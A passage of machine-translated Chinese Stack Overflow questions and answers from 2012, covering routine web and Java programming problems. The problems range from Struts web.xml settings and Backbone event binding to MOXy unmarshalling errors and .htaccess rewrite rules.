function example_ajax_request() {
  $('#example-placeholder').html('<p><img src="/images/loader.gif" width="220" height="19" /></p>');
  $('#example-placeholder').load("/examples/loaded.html");
} 
```

# java - Servlet 代码的意义

> ID：10811043
> 
> 赞同：-1
> 
> 时间：2012-05-30T06:31:10.680
> 
> 标签：java, servlets, web.xml

我正在学习 Servlet。在应用程序的 web.xml 中，我找到了以下 Servlet 代码。

有人可以解释一下代码的重要性吗

```
<servlet id="Servlet_1060120206078">
    <servlet-name>action</servlet-name>
    <servlet-class>org.apache.struts.action.ActionServlet</servlet-class>
    <init-param id="InitParam_1060120206077">
        <param-name>config</param-name>
        <param-value>/WEB-INF/struts-config.xml</param-value>
    </init-param>
    <init-param id="InitParam_1060120206076">
        <param-name>debug</param-name>
        <param-value>2</param-value>
    </init-param>
    <init-param id="InitParam_1069371544495">
        <param-name>detail</param-name>
        <param-value>2</param-value>
    </init-param>
    <init-param id="InitParam_1069371544496">
        <param-name>validate</param-name>
        <param-value>true</param-value>
    </init-param>
    <load-on-startup>2</load-on-startup>
</servlet> 
```

谢谢尼尔玛利亚

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-30T06:35:30.430

这只是定义一个用于处理请求的 servlet（在本例中为 Struts 的 FrontController）。稍后在文件中，我相信您还会找到一个 servlet 映射，该映射将此 servlet 映射到 http 请求。

`<init-param>`元素是 servlet 在启动时可以读取的键/值对。Struts 使用这些进行配置。

所有 InitParam_XXX 的东西都是不必要的，我猜它是由某个编辑器机器生成的。

查看此内容以获取更多详细信息：

[http://netbeans.org/kb/docs/web/quickstart-webapps-struts.html](http://netbeans.org/kb/docs/web/quickstart-webapps-struts.html)

# javascript - Javascript正则表达式用新词替换多个词

> ID：10811044
> 
> 赞同：1
> 
> 时间：2012-05-30T06:31:11.330
> 
> 标签：javascript, jquery, regex

每次我渲染 HTML 模板时，我都会尝试用新单词替换多个单词。

而不是必须循环遍历模板（非常大）三次来查找三个不同的单词，我想**将这三个单词及其替换组合起来**，并且只遍历模板一次。（另外，很明显，下面的代码只替换了最后一个单词，{id}​​，因为它覆盖了上面的其他两个替换尝试）。

```
 $.get('/templates/list-item.html', function(data) {
          var template = data,
              tmp = '';

          $.getJSON('conf.json', function(data) {
            var items = [],
                list = data.default;

            for (var item in list) {
              var name = item.name,
                  value = list[item].value,
                  id = list[item].id;

              tmp = template.replace('{name}', name);
              tmp = template.replace('{value}', value);
              tmp = template.replace('{id}', id);

              items.push(tmp);
            }

            $('<div/>', {
              html: items.join('')
            }).appendTo('body');
          });
        }); 
```

显然渲染模板不应该用JS来做，但由于它仅供内部使用，没有可用的后端，也不需要谷歌索引，暂时还好。

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-05-30T06:37:36.997

您可以使用回调函数来替换模板变量。考虑例如：

```
template = "{foo} and {bar}"
data = {foo:123, bar:456}

template.replace(/{(\w+)}/g, function($0, $1) {
    return data[$1];
}); 
```

我还建议用[map()](http://api.jquery.com/jQuery.map/)替换循环：

```
items = $.map(list, function(item) {
   var data = {name: item.name, value:.... etc }
   return template.replace(/{(\w+)}/g, function($0, $1) {
       return data[$1];
   });
} 
```

`/{(\w+)}/g`基本上意味着以下内容：

```
/                - start pattern
{                - match { literally
    (            - begin group 1
        \w       - a "word" character (letter+digit+underscore)
        +        - repeat once or more
    )            - end group 1
}                - match } literally
/                - end pattern
g                - match globally, i.e. all occurences 
```

当回调函数被调用时，它获取整个匹配作为它的第一个参数和组 1 的值作为第二个参数。所以当它看到时`{foobar}`，它会调用`callback("{foobar}", "foobar")`。

# android - 片段和活动 Android

> ID：10811053
> 
> 赞同：0
> 
> 时间：2012-05-30T06:32:05.967
> 
> 标签：android, android-fragments, android-activity

在活动中，我可以将布局 xml 关联如下

```
public void onCreate(Bundle savedInstanceState) {
  super.onCreate(savedInstanceState);
  setContentView(R.layout.main);
} 
```

如何在`onCreate()`类中`Fragment`加载一个`Activity`？

我有片段类，如下所示

```
public class TestFragment extends Fragment {
  public View onCreateView(LayoutInflater inflater, ViewGroup container, Bundle saved) {
  }
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-30T07:40:47.933

如果您想在片段内膨胀 xml 布局，您可以使用 LayoutInflater 轻松完成：

```
@Override
    public View onCreateView(LayoutInflater inflater, ViewGroup container,
            Bundle savedInstanceState) {
        return inflater.inflate(R.layout.your_layout, container, false);
    } 
```

如需更多信息，请阅读官方[片段参考](http://developer.android.com/guide/topics/fundamentals/fragments.html)。

# java - Java：通用类异常

> ID：10811054
> 
> 赞同：1
> 
> 时间：2012-05-30T06:32:22.563
> 
> 标签：java, generics, exception, singly-linked-list

我正在设计一个通用链表来创建字符串的链表。
但是我不断收到此错误：

```
Exception in thread "main" java.lang.NoSuchMethodError: Node.<init>(Ljava/lang/Object;)V
at LinkedList.addNode(LinkedList.java:10)
at LinkedList.<init>(LinkedList.java:22)
at Trial.main(Trial.java:7) 
```

从堆栈跟踪中，错误是在 LinkedList 的 addNode() 方法中生成的。我包括此方法的定义以及 Node 类的定义。
**链表 addNode()**

```
public void addNode(T n) {
        Node<T> temp = new Node<T>(n);
        if(start==null) {
            start = temp;
            current = start;
        } else {
            end.setNext(temp);
        }
        end =temp;
    } 
```

**节点.java**

```
public class Node<T>{
private T n;
Node next;
Node(T n) {
    this.n = n;
    next = null;
}
public void setNext(Node nextNode) {
    next = nextNode;
}
public Node getNext() {
    return next;
}
public T getN() {
    return n;
}
@Override
public String toString() {
    if(n instanceof String)
        return n.toString();
    else {
        return T.toString();
    }
} 
```

}

**链表.java**

```
public class LinkedList<T>{
Node start;
Node end;
Node current;
private static final long serialVersionUID = 901L;
    LinkedList(T n) {
        addNode(n);
    }
    public void addNode(T n) {
        Node<T> temp = new Node<>(n);
        if(start==null) {
            start = temp;
            current = start;
        } else {
            end.setNext(temp);
        }
        end =temp;
    }

    LinkedList(T[] n) {
        for(T print : n)
        addNode(print);
    }
    public void addNode(T[] n) {
        if(n!=null) {
            for (T values : n) {
                addNode(values);
            }
        }
    }

    public void incC() {
        current = current.getNext();
    }
    public void insert(T n) {
        Node newNode = new Node(n);
            if(current==start){
                newNode.setNext(current);
                start = newNode;
            }else {
                Node tempstart = start;
                Node prevAdd=null;
                while(tempstart!=current){
                    prevAdd = tempstart;
                    tempstart = tempstart.getNext();
                }
                prevAdd.setNext(newNode);
                newNode.setNext(current);
            }
    }

    public void find(T x) {
        Node tempstart;
        tempstart = start;
        while (tempstart!=null) {
            if(tempstart.getN()==x) {
                System.out.println("Element found");
                tempstart = tempstart.getNext();
            } else {
                tempstart = tempstart.getNext();
            }
        }
    }
    public void delete(T x) {
        Node previous=null;
        Node tempstart = start;
        while(tempstart!=null) {
        if(tempstart.getN()==x) {
            if(previous ==null) {
                previous = tempstart;
                tempstart = tempstart.getNext();
                start = tempstart;
                previous.setNext(null);
                previous = null;
            } else {
                tempstart = tempstart.getNext();
                previous.setNext(tempstart);
            }
        }else {
            previous = tempstart;
            tempstart = tempstart.getNext();
        }
        }
    }
    @Override
    public String toString() {
        Node tempNode = start;
        String str = "Values: ";
        while (tempNode!=null) {
            str = str + " " + tempNode.toString();
            tempNode = tempNode.getNext();
        }
        return str;
    }
} 
```

**试用版.java**

```
public class Trial {
public static void main(String[] args) {
    String[] para = {"Hollo","this","is","me"};
    LinkedList<String> L1;
    L1 = new LinkedList<String>(para);
    System.out.println(L1);
} 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-05-30T06:36:36.263

```
return T.toString(); 
```

这不起作用。T 是一个类型变量，由于类型擦除，仅在编译时可用。

但除此之外，我看不出有什么问题，您需要从 LinkedList 类中发布更多代码。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-05-30T07:18:00.763

您应该将`start`、`end`和中的`current`字段声明为类型，而不是。不要在代码中的任何地方使用原始类型，因为它们会转换为.`LinkedList< T >``next``Node< T >``Node< T >``Node``Node< Object >`

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-05-30T06:38:12.393

您的类`Node`无法编译，因此您可能应该先解决该问题，然后再继续：

```
return T.toString(); 
```

没有意义。可能只是写这个：

```
return n.toString(); 
```

现在就足够了。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-05-30T06:46:54.710

在 Node.java 中，在方法中

```
@Override 
public String toString() { 
    if(n instanceof String) 
        return n.toString(); 
    else { 
        return T.toString(); 
    } 
} 
```

// 下面的语句抛出编译错误。返回 T.toString();

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2012-05-30T07:17:07.130

您的`Node`Constructor is not `public`，因此如果您从另一个包中的类调用它，它将不起作用。

# ajax - 在 Wordpress 站点中显示跨域提要 RSS

> ID：10811065
> 
> 赞同：0
> 
> 时间：2012-05-30T06:33:06.370
> 
> 标签：ajax, wordpress

我需要在我的站点中显示跨域 feeds-rss（XML 格式），但由于不允许 ajax 跨域调用而出现错误。有人告诉我 json-p ......有人知道如何使用或有一些好的教程吗？

谢谢

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-30T07:03:14.617

最简单的方法就是为 wordpress 创建一个小部件或下载某种类似您的要求的小部件。

因为如果您想从格式中获取数据，则以格式`json-p`加载数据，那么给定的链接将帮助您：`JSON``JSON`

[getJSON](http://api.jquery.com/jQuery.getJSON/) [ajax](http://api.jquery.com/jQuery.ajax/)

或者您可以使用 php 访问 rss 提要，例如给出的示例：

```
$xml = 'http://blog.webtech11.com/feed';
                $doc = new DOMDocument();
                $doc->load($xml);
                $item = $doc->getElementsByTagName('item');

                //$data = array();

                for($i=0; $i<=3; $i++){
                    $title = $item->item($i)->getElementsByTagName('title')->item(0)->childNodes->item(0)->nodeValue;
                    $link = $item->item($i)->getElementsByTagName('link')->item(0)->childNodes->item(0)->nodeValue;
                    echo '<a href="' . $link . '" target="_blank"><h2>' . $title . '</h2></a>';
                } 
```

在这个例子中，我访问了最新的 4 个博客条目。

希望对你有帮助

# xpath - 使用 selenium webdriver(xpath) 读取文本

> ID：10811066
> 
> 赞同：7
> 
> 时间：2012-05-30T06:33:08.503
> 
> 标签：xpath, selenium, webdriver

我正在使用 selenium 使用 xpath 在我的网页上获取一些文本。

页面标签结构如下——

```
<span id="data" class="firefinder-match">
    Seat Height, Laden
  <sup>
     <a class="speckeyfootnote" rel="p7" href="#">7</a>
  </sup>
</span> 
```

如果我使用以下代码 -

```
driver.findElement(By.xpath("//span[@id='data']")).getText(); 
```

我得到结果=`Seat Height, Laden 7`

但我想避免阅读`<sup>`标签内的文字并得到结果`Seat Height, Laden`

请让我知道我可以使用哪个 xpath 表达式来获得我想要的结果。

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-05-31T15:33:58.373

我不知道在 Selenium 中有什么方法可以做到这一点，所以有我的 JS 解决方案。这个想法是获取元素的所有子元素（包括文本节点），然后仅选择文本节点。您可能需要添加一些`.trim()`（或 JS 等效的）调用来消除不需要的空格。

整个代码：

```
WebElement elem = driver.findElement(By.id("data"));
String text;
if (driver instanceof JavascriptExecutor) {
    text = ((JavascriptExecutor)driver).executeScript(
            "var nodes = arguments[0].childNodes;" +
            "var text = '';" +
            "for (var i = 0; i < nodes.length; i++) {" +
            "    if (nodes[i].nodeType == Node.TEXT_NODE) {" +
            "        text += nodes[i].textContent;" +
            "    }" +
            "}" +
            "return text;"
            , elem);
} 
```

* * *

并且只是为了更好的可读性的 JS。

```
var nodes = arguments[0].childNodes;
var text = '';
for (var i = 0; i < nodes.length; i++) {
    if (nodes[i].nodeType == Node.TEXT_NODE) {
        text += nodes[i].textContent;
    }
}
return text; 
```

# javascript - 在主干视图中绑定多种事件类型

> ID：10811067
> 
> 赞同：29
> 
> 时间：2012-05-30T06:33:16.963
> 
> 标签：javascript, backbone.js, backbone-events, backbone-views

我想知道是否可以在单行中绑定主干中的多个事件类型。

考虑以下：

```
var MyView = Backbone.View.extend({
    id: 'foo',
    events: {
        'click .bar': 'doSomething',
        'touchstart .bar': 'doSomething'
    },
    doSomething: function(e) {
        console.log(e.type);
    }
}); 
```

基本上我想知道的是是否可以将“click”和“touchstart”的事件绑定组合成一行 - 沿着：

```
events: { 'click,touchstart .bar': 'doSomething' } 
```

任何建议，将不胜感激。

* * *

## 回答 #1

> 赞同：18
> 
> 时间：2012-05-30T08:43:09.773

视图 jQuery 事件是不可能的，它是通过[`delegateEvents`](http://documentcloud.github.com/backbone/#View-delegateEvents). [但是，主干事件](http://documentcloud.github.com/backbone/#Events-on)是可能的：

```
book.on("change:title change:author", ...); 
```

* * *

## 回答 #2

> 赞同：15
> 
> 时间：2012-08-30T08:44:38.743

对于任何感兴趣的人，我最终都覆盖`delegateEvents`了 Backbone.View。

只需修改几行即可获得所需的功能。

[您可以在我在 github 上的提交](https://github.com/stephenmuss/backbone/commit/09c5eed3a1ed3d0ed6af15f65a9d0af9e72d869a)中看到差异

这是`delegateEvents`修改后的状态：

```
delegateEvents: function(events) {
    if (!(events || (events = getValue(this, 'events')))) return;
    this.undelegateEvents();
    for (var key in events) {
        var method = events[key];
        if (!_.isFunction(method)) method = this[events[key]];
        if (!method) throw new Error('Method "' + events[key] + '" does not exist');
        var match = key.match(delegateEventSplitter);
        var eventTypes = match[1].split(','), selector = match[2];
        method = _.bind(method, this);
        var self = this;
        _(eventTypes).each(function(eventName) {
            eventName += '.delegateEvents' + self.cid;
            if (selector === '') {
              self.$el.bind(eventName, method);
            } else {
                self.$el.delegate(selector, eventName, method);
            }
        });
    }
} 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2016-01-07T10:15:46.473

我们也可以这样做。具有管理每个事件之间的空间的优势。

[Github 在这里提交](https://github.com/BigFax/backbone/commit/eeaaaa49bbd158d20c85114b8d9cc651f4d7bcb1)

直接将其添加到 Backbone 中：

```
delegateEvents: function(events) {
  events || (events = _.result(this, 'events'));
  if (!events) return this;
  this.undelegateEvents();
  for (var key in events) {
    var method = events[key];
    if (!_.isFunction(method)) method = this[method];
    if (!method) continue;
    var match = key.match(delegateEventSplitter);
    this.delegate(match[1], match[2], _.bind(method, this));
  }
  return this;
} 
```

覆盖委托事件方法：

```
Backbone.View.prototype.originalDelegateEvents = Backbone.View.prototype.delegateEvents;
Backbone.View.prototype.delegateEvents = function(events) {
    events || (events = _.result(this, 'events'));
    if (!events) return this;
    this.undelegateEvents();
    for (var key in events) {
        var method = events[key], combinedEvents = key.split(',');
        if (!_.isFunction(method)) method = this[method];
        if (!method) continue;

        for(var i = 0, match = null; i < combinedEvents.length; ++i) {
            match = combinedEvents[i].trim().match(/^(\S+)\s*(.*)$/);
            this.delegate(match[1], match[2], _.bind(method, this));
        }
    }
    return this;
}; 
```

我们现在可以在一行中管理事件：

```
events: { 
    'click a[data-anchor], wheel, keydown': 'scroll'
} 
```

# asp.net-mvc-3 - .aspx 重定向到 Umbraco 5 页面

> ID：10811070
> 
> 赞同：1
> 
> 时间：2012-05-30T06:33:36.580
> 
> 标签：asp.net-mvc-3, redirect, asp.net-mvc-3-areas, umbraco5

我在我的 Umbraco 5 Web 应用程序中有一个名为“en”的自定义区域，我想将我的旧链接（在其他站点上的 Umbraco 5 之前）自动重定向到新链接，在我的区域注册文件中，我已将新路线映射为

```
context.MapRoute(
             "en_Home",
            "en/{url}.aspx",
            new { action = "HomeRedirection", controller = "Redirection"}
            ); 
```

但它给了我“找不到资源”，如果我删除它可以工作的 .aspx 位，我创建了一个简单的 mvc3 应用程序来测试我的代码，并且它一切正常，“.aspx”链接使用上面的代码正常重定向，我不知道我做错了什么，任何帮助将不胜感激。

提前致谢，

雪儿

# java - JCreator 有没有像 Resharper (VS2010) 这样的对象？

> ID：10811072
> 
> 赞同：0
> 
> 时间：2012-05-30T06:33:38.520
> 
> 标签：java, visual-studio-2010, resharper, jcreator

我有一段 java 代码，其中包括一些函数和库。我在 JCreator LE v5.0 中处理它，我需要一个类似 Resharper 的对象，以便我选择函数并轻松切换到它的定义。

就像我们在 VS2010 中所做的那样，如果我们安装了 Resharper，我们可以跳转到任何函数的定义，我想在 JCreator 中做同样的事情？？？

我可以帮忙吗？

# mysql - 从 Active Record 查询中删除 URL 编码

> ID：10811076
> 
> 赞同：0
> 
> 时间：2012-05-30T06:33:44.030
> 
> 标签：mysql, ruby, ruby-on-rails-3

我一如既往地不知所措，但这是我学习的唯一途径。现在我正在尝试在数据库中查询当前用户的列并返回值。我正在使用类似的东西：

```
@tags = current_user.tags.select(:name).each { |p| p.name} 
```

但它返回：

```
%5B%23%3CTag+name%3A+%22tag1%22%3E%2C+%23%3CTag+name%3A+%22tag2%22%3E%2C+%23%3CTag+name%3A+%22tag+test%22%3E%5D 
```

据我了解，这是 Url Encoding。有可能把它清理干净吗？我试过使用`.delete`or`.gsub`但我一定做错了什么。有什么见解吗？我对该网站的所有研究都产生了如何进行 URL 编码，而不是 URL 解码。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-30T20:37:49.027

对于 URI 编码/解码，您可以查看[ruby​​onrails.org:URI::Escape](http://corelib.rubyonrails.org/classes/URI/Escape.html)

要在 Rails 视图中显示 HTML，请查看 raw() 方法[ruby​​onrails.org:ActionView::Helpers::OutputSafetyHelper](http://api.rubyonrails.org/classes/ActionView/Helpers/OutputSafetyHelper.html)

# jaxb - XMLDirectMapping - 未提供转化价值

> ID：10811078
> 
> 赞同：4
> 
> 时间：2012-05-30T06:33:45.220
> 
> 标签：jaxb, eclipselink, moxy, docx4j

docx4j（我托管）通常与 Sun/Oracle JAXB 实现一起使用；下面感兴趣的类是使用 XJC 生成的。

继[MOXy 人员友好修复](https://stackoverflow.com/questions/10680021/moxy-xmlcompositecollectionmapping-descriptor-is-missing)的较早问题之后，我将继续尝试使其与 EclipseLink MOXy 一起使用。

对于特定的 DOM 文档，我现在得到：

```
[Exception [EclipseLink-25004] (Eclipse Persistence Services - 2.4.0.v20120529-r11529): org.eclipse.persistence.exceptions.XMLMarshalException
Exception Description: An error occurred unmarshalling the document
Internal Exception: Exception [EclipseLink-116] (Eclipse Persistence Services - 2.4.0.v20120529-r11529): org.eclipse.persistence.exceptions.DescriptorException
Exception Description: No conversion value provided for the value [1] in field [@ns1:val].
Mapping: org.eclipse.persistence.oxm.mappings.XMLDirectMapping[val-->@ns1:val]
Descriptor: XMLDescriptor(org.docx4j.math.CTOnOff --> [])]
    at org.eclipse.persistence.jaxb.JAXBBinder.unmarshal(JAXBBinder.java:100)
    at org.docx4j.openpackaging.parts.JaxbXmlPartXPathAware.unmarshal(JaxbXmlPartXPathAware.java:211)
    at org.docx4j.openpackaging.io.LoadFromZipNG.getRawPart(LoadFromZipNG.java:556)
    at org.docx4j.openpackaging.io.LoadFromZipNG.getPart(LoadFromZipNG.java:427)
    at org.docx4j.openpackaging.io.LoadFromZipNG.addPartsFromRelationships(LoadFromZipNG.java:350)
    at org.docx4j.openpackaging.io.LoadFromZipNG.process(LoadFromZipNG.java:243)
    at org.docx4j.openpackaging.io.LoadFromZipNG.get(LoadFromZipNG.java:193)
    at org.docx4j.openpackaging.packages.OpcPackage.load(OpcPackage.java:301)
    at org.docx4j.openpackaging.packages.OpcPackage.load(OpcPackage.java:245)
    at org.docx4j.openpackaging.packages.OpcPackage.load(OpcPackage.java:195)
    at org.docx4j.openpackaging.packages.OpcPackage.load(OpcPackage.java:178)
    at org.docx4j.openpackaging.packages.WordprocessingMLPackage.load(WordprocessingMLPackage.java:172)
    at org.docx4j.samples.OpenAndSaveRoundTripTest.main(OpenAndSaveRoundTripTest.java:60)
Caused by: Exception [EclipseLink-25004] (Eclipse Persistence Services - 2.4.0.v20120529-r11529): org.eclipse.persistence.exceptions.XMLMarshalException
Exception Description: An error occurred unmarshalling the document
Internal Exception: Exception [EclipseLink-116] (Eclipse Persistence Services - 2.4.0.v20120529-r11529): org.eclipse.persistence.exceptions.DescriptorException
Exception Description: No conversion value provided for the value [1] in field [@ns1:val].
Mapping: org.eclipse.persistence.oxm.mappings.XMLDirectMapping[val-->@ns1:val]
Descriptor: XMLDescriptor(org.docx4j.math.CTOnOff --> [])
    at org.eclipse.persistence.exceptions.XMLMarshalException.unmarshalException(XMLMarshalException.java:109)
    at org.eclipse.persistence.internal.oxm.XMLCompositeObjectMappingNodeValue.startElement(XMLCompositeObjectMappingNodeValue.java:328)
    at org.eclipse.persistence.oxm.record.UnmarshalRecord.startElement(UnmarshalRecord.java:783)
    at org.eclipse.persistence.internal.oxm.record.DOMReader.reportElementEvents(DOMReader.java:147)
    at org.eclipse.persistence.internal.oxm.record.DOMReader.handleChildNodes(DOMReader.java:250)
    at org.eclipse.persistence.internal.oxm.record.DOMReader.reportElementEvents(DOMReader.java:148)
    at org.eclipse.persistence.internal.oxm.record.DOMReader.handleChildNodes(DOMReader.java:250)
    at org.eclipse.persistence.internal.oxm.record.DOMReader.reportElementEvents(DOMReader.java:148)
    at org.eclipse.persistence.internal.oxm.record.DOMReader.handleChildNodes(DOMReader.java:250)
    at org.eclipse.persistence.internal.oxm.record.DOMReader.reportElementEvents(DOMReader.java:148)
    at org.eclipse.persistence.internal.oxm.record.DOMReader.handleChildNodes(DOMReader.java:250)
    at org.eclipse.persistence.internal.oxm.record.DOMReader.reportElementEvents(DOMReader.java:148)
    at org.eclipse.persistence.internal.oxm.record.DOMReader.handleChildNodes(DOMReader.java:250)
    at org.eclipse.persistence.internal.oxm.record.DOMReader.reportElementEvents(DOMReader.java:148)
    at org.eclipse.persistence.internal.oxm.record.DOMReader.handleChildNodes(DOMReader.java:250)
    at org.eclipse.persistence.internal.oxm.record.DOMReader.reportElementEvents(DOMReader.java:148)
    at org.eclipse.persistence.internal.oxm.record.DOMReader.handleChildNodes(DOMReader.java:250)
    at org.eclipse.persistence.internal.oxm.record.DOMReader.reportElementEvents(DOMReader.java:148)
    at org.eclipse.persistence.internal.oxm.record.DOMReader.handleChildNodes(DOMReader.java:250)
    at org.eclipse.persistence.internal.oxm.record.DOMReader.reportElementEvents(DOMReader.java:148)
    at org.eclipse.persistence.internal.oxm.record.DOMReader.handleChildNodes(DOMReader.java:250)
    at org.eclipse.persistence.internal.oxm.record.DOMReader.reportElementEvents(DOMReader.java:148)
    at org.eclipse.persistence.internal.oxm.record.DOMReader.parse(DOMReader.java:89)
    at org.eclipse.persistence.internal.oxm.record.SAXUnmarshaller.unmarshal(SAXUnmarshaller.java:462)
    at org.eclipse.persistence.oxm.XMLBinder.unmarshal(XMLBinder.java:84)
    at org.eclipse.persistence.jaxb.JAXBBinder.unmarshal(JAXBBinder.java:89)
    ... 12 more
Caused by: Exception [EclipseLink-116] (Eclipse Persistence Services - 2.4.0.v20120529-r11529): org.eclipse.persistence.exceptions.DescriptorException
Exception Description: No conversion value provided for the value [1] in field [@ns1:val].
Mapping: org.eclipse.persistence.oxm.mappings.XMLDirectMapping[val-->@ns1:val]
Descriptor: XMLDescriptor(org.docx4j.math.CTOnOff --> [])
    at org.eclipse.persistence.oxm.record.UnmarshalRecord.startElement(UnmarshalRecord.java:851)
    at org.eclipse.persistence.internal.oxm.XMLRelationshipMappingNodeValue.processChild(XMLRelationshipMappingNodeValue.java:91)
    at org.eclipse.persistence.internal.oxm.XMLCompositeObjectMappingNodeValue.startElement(XMLCompositeObjectMappingNodeValue.java:323)
    ... 36 more
Caused by: Exception [EclipseLink-116] (Eclipse Persistence Services - 2.4.0.v20120529-r11529): org.eclipse.persistence.exceptions.DescriptorException
Exception Description: No conversion value provided for the value [1] in field [@ns1:val].
Mapping: org.eclipse.persistence.oxm.mappings.XMLDirectMapping[val-->@ns1:val]
Descriptor: XMLDescriptor(org.docx4j.math.CTOnOff --> [])
    at org.eclipse.persistence.exceptions.DescriptorException.noFieldValueConversionToAttributeValueProvided(DescriptorException.java:1052)
    at org.eclipse.persistence.mappings.converters.ObjectTypeConverter.convertDataValueToObjectValue(ObjectTypeConverter.java:140)
    at org.eclipse.persistence.oxm.mappings.XMLDirectMapping.getAttributeValue(XMLDirectMapping.java:287)
    at org.eclipse.persistence.internal.oxm.XMLDirectMappingNodeValue.attribute(XMLDirectMappingNodeValue.java:153)
    at org.eclipse.persistence.oxm.record.UnmarshalRecord.startElement(UnmarshalRecord.java:834)
    ... 38 more 
```

那是与 JAXBBinder.unmarshall 一起使用的。如果我使用 JAXBUnmarshaller.unmarshal，也会发生同样的事情：

```
[Exception [EclipseLink-25004] (Eclipse Persistence Services - 2.4.0.v20120529-r11529): org.eclipse.persistence.exceptions.XMLMarshalException
Exception Description: An error occurred unmarshalling the document
Internal Exception: Exception [EclipseLink-116] (Eclipse Persistence Services - 2.4.0.v20120529-r11529): org.eclipse.persistence.exceptions.DescriptorException
Exception Description: No conversion value provided for the value [1] in field [@ns1:val].
Mapping: org.eclipse.persistence.oxm.mappings.XMLDirectMapping[val-->@ns1:val]
Descriptor: XMLDescriptor(org.docx4j.math.CTOnOff --> [])]
    at org.eclipse.persistence.jaxb.JAXBUnmarshaller.handleXMLMarshalException(JAXBUnmarshaller.java:956)
    at org.eclipse.persistence.jaxb.JAXBUnmarshaller.unmarshal(JAXBUnmarshaller.java:210) 
```

导致损坏的 XML 文件可以在[https://gist.github.com/2834081](https://gist.github.com/2834081)和[org.docx4j.math.CTOnOff 找到](https://github.com/plutext/docx4j/blob/master/src/main/java/org/docx4j/math/CTOnOff.java)。

有什么建议么？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-05-31T15:15:09.217

**注意：** 我是[**EclipseLink JAXB (MOXy)**](http://www.eclipse.org/eclipselink/moxy.php)的负责人，也是[**JAXB (JSR-222)**](http://jcp.org/en/jsr/detail?id=222)专家组的成员。

被解组的 XML 文档实际上是无效的。如果`ns1:val`属性中的值被更改以匹配允许的枚举值，那么一切都会按预期工作。

**XML 文件**

xml doc 的第 95 行是这个

```
<m:radPr>
    <m:degHide m:val="1" /> 
```

**停止关闭**

1 不是有效值...应该是“开”或“关”

```
@XmlType(name = "ST_OnOff")
@XmlEnum
public enum STOnOff {

    @XmlEnumValue("on")
    ON("on"),
    @XmlEnumValue("off")
    OFF("off");
    private final String value;

} 
```

**CTRadPr**

```
public class CTRadPr  implements Child
{
    protected CTOnOff degHide;
    protected CTCtrlPr ctrlPr;
    ...
} 
```

**CTOnOff**

```
@XmlType(name = "CT_OnOff")
public class CTOnOff  implements Child
{
    @XmlAttribute(namespace = "http://schemas.openxmlformats.org/officeDocument/2006/math")
    protected STOnOff val; 
```

MOXy 中有一个与处理无效值相关的错误。MOXy 应该做的是，当它发现无效值时，它应该向`ValidationEventHandler`. 如果`ValidationEventHandler`处理事件，则不会为相应的字段/属性设置值。当您使用 JAXB RI 尝试此操作时，您将看到无效值未填充到对象模型中

您可以使用以下错误来跟踪我们在此问题上的进展：

*   [http://bugs.eclipse.org/381217](http://bugs.eclipse.org/381217)

* * *

**更新**

我们已修复EclipseLink 2.4.0 流中的[错误 381217](http://bugs.eclipse.org/381217)。您可以从以下位置下载夜间标签：

*   [http://www.eclipse.org/eclipselink/downloads/nightly.php](http://www.eclipse.org/eclipselink/downloads/nightly.php)

**注意：** 通过修复，MOXy 将报告无效属性值的验证事件，就像它报告无效元素值一样。这与 JAXB-RI 的行为不同，它为无效元素而不是无效属性引发验证事件。我相信 RI 行为是一个错误。

# ruby-on-rails - 如何在 ROR Web 应用程序上绘制图表/图形

> ID：10811079
> 
> 赞同：2
> 
> 时间：2012-05-30T06:33:49.600
> 
> 标签：ruby-on-rails, google-visualization

是否有任何 API 可以在 ROR Web 应用程序中绘制图表/图形。我需要从我的数据库（Sqlite3）中提取数据。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-05-30T06:45:35.210

你应该使用 Jquery highcharts

```
 http://www.highcharts.com/ 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-05-30T06:41:32.153

安装[这个](https://github.com/michelson/lazy_high_charts)gem。浏览[wiki](https://github.com/michelson/lazy_high_charts/wiki)部分。似乎很容易。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-05-30T06:42:08.500

[Highcharts-rails gem](https://github.com/PerfectlyNormal/highcharts-rails)可以帮助你。此外，还有一个[Railscast](http://railscasts.com/episodes/223-charts)描述了要做什么

# .htaccess - .htaccess 停止内部重定向

> ID：10811081
> 
> 赞同：2
> 
> 时间：2012-05-30T06:34:00.113
> 
> 标签：.htaccess, mod-rewrite, redirect

首先，这是我的目录结构

```
/localhost/p/
  .htaccess
/localhost/p/inc/
  style.css 
```

我有这个片段`/localhost/p/.htaccess`

```
Options -MultiViews +FollowSymLinks 
RewriteEngine On
RewriteBase /p/

RewriteCond %{REQUEST_FILENAME} ^(.+)/([^/]+)$
RewriteCond %1/inc/%2 -f
RewriteRule ([^/]+)$ inc/$1 [L]

RewriteRule ^(.+)$ index.php [QSA,L] 
```

它不允许我访问文件，`localhost/p/style.css`但它会让我访问 index.php

这是日志

```
[perdir D:/p/] strip per-dir prefix: D:/p/style.css -> style.css
[perdir D:/p/] applying pattern '([^/]+)$' to uri 'style.css'
[perdir D:/p/] RewriteCond: input='D:/p/style.css' pattern='^(.+)/([^/]+)$' => matched
[perdir D:/p/] RewriteCond: input='D:/p/inc/style.css' pattern='-f' => matched
[perdir D:/p/] rewrite 'style.css' -> 'inc/style.css'
[perdir D:/p/] add per-dir prefix: inc/style.css -> D:/p/inc/style.css

// I don't know how to stop the .htaccess here, and just get the file
// instead go with [INTERNAL REDIRECT]

[perdir D:/p/] trying to replace prefix D:/p/ with /p/
strip matching prefix: D:/p/inc/style.css -> inc/style.css
add subst prefix: inc/style.css -> /p/inc/style.css
[perdir D:/p/] internal redirect with /p/inc/style.css [INTERNAL REDIRECT]
[perdir D:/p/] strip per-dir prefix: D:/p/inc/style.css -> inc/style.css
[perdir D:/p/] applying pattern '([^/]+)$' to uri 'inc/style.css'
